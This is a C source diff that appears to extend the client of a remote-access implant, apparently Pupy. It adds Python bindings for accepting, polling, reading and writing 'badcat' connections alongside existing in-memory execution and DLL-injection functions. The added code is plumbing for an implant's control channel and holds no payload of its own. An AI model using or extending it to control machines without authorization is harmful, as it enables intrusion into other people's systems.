@@ -428,6 +428,83 @@ static PyObject *Py_is_shared_object(PyObject *self, PyObject *args)
 #endif
 }
 
+#ifndef _PUPY_SO
+#include "debug.h"
+#include "Python-dynload.h"
+
+uint64_t badcat_wait_conn(uint16_t port);
+char * badcat_read_conn(uint64_t conn_id, size_t size, size_t *buf_len);
+size_t badcat_write_conn(uint64_t conn_id, const char *buf, size_t buf_len);
+int badcat_poll_conn(uint64_t conn_id, uint64_t timeout);
+
+PyObject *Py_badcat_accept_conn(PyObject *self, PyObject *args) {
+    uint16_t port;
+    uint64_t conn_id;
+
+    if (!PyArg_ParseTuple(args, "H", &port)) {
+        return NULL;
+    }
+
+    conn_id = badcat_wait_conn(port);
+
+    if (conn_id == 0) {
+        PyErr_SetString(ExecError, "Failed to accept new connection");
+        return NULL;
+    }
+
+    return Py_BuildValue("n", conn_id);
+}
+
+PyObject *Py_badcat_poll_conn(PyObject *self, PyObject *args) {
+    Py_ssize_t conn_id;
+    Py_ssize_t timeout;
+    int poll;
+
+    if (!PyArg_ParseTuple(args, "nn", &conn_id, &timeout)) {
+        return NULL;
+    }
+
+    poll = badcat_poll_conn((uint64_t)conn_id, (uint64_t)timeout);
+
+    return PyBool_FromLong(poll);
+}
+
+PyObject *Py_badcat_read_conn(PyObject *self, PyObject *args) {
+    char *buf;
+    Py_ssize_t conn_id;
+    Py_ssize_t size;
+    size_t buf_len;
+
+    if (!PyArg_ParseTuple(args, "nn", &conn_id, &size)) {
+        return NULL;
+    }
+
+    buf = badcat_read_conn((uint64_t)conn_id, (size_t)size, &buf_len);
+
+    if (buf == 0) {
+        PyErr_SetString(ExecError, "Failed to read from badcat connection");
+        return NULL;
+    }
+
+    return Py_BuildValue("s#", buf, (Py_ssize_t)buf_len);
+}
+
+PyObject *Py_badcat_write_conn(PyObject *self, PyObject *args) {
+    char *buf;
+    Py_ssize_t conn_id;
+    int buf_size;
+    size_t write;
+
+    if (!PyArg_ParseTuple(args, "ns#", &conn_id, &buf, &buf_size)) {
+        return NULL;
+    }
+
+    write = badcat_write_conn((uint64_t)conn_id, buf, (size_t)buf_size);
+
+    return Py_BuildValue("n", write);
+}
+#endif
+
 static PyMethodDef methods[] = {
     { "is_shared", Py_is_shared_object, METH_NOARGS, DOC("Client is shared object") },
     { "get_arch", Py_get_arch, METH_NOARGS, DOC("get current pupy architecture (x86 or x64)") },
@@ -445,6 +522,12 @@ static PyMethodDef methods[] = {
       DOC("import_module(data, size, initfuncname, path) -> module") },
     { "mexec", Py_mexec, METH_VARARGS, DOC("mexec(data, argv, redirected_stdio, detach) -> (pid, (in, out, err))") },
     { "ld_preload_inject_dll", Py_ld_preload_inject_dll, METH_VARARGS, DOC("ld_preload_inject_dll(cmdline, dll_buffer, hook_exit) -> pid") },
+#ifndef _PUPY_SO
+    { "badcat_accept_conn", Py_badcat_accept_conn, METH_VARARGS, DOC("badcat_accept_conn(port) -> conn_id") },
+    { "badcat_read_conn", Py_badcat_read_conn, METH_VARARGS, DOC("badcat_read_conn(conn_id) -> data") },
+    { "badcat_write_conn", Py_badcat_write_conn, METH_VARARGS, DOC("badcat_write_conn(conn_id, data) -> size") },
+    { "badcat_poll_conn", Py_badcat_poll_conn, METH_VARARGS, DOC("badcat_poll_conn(conn_id, timeout) -> can_poll") },
+#endif
     { NULL, NULL },     /* Sentinel */
 };
 
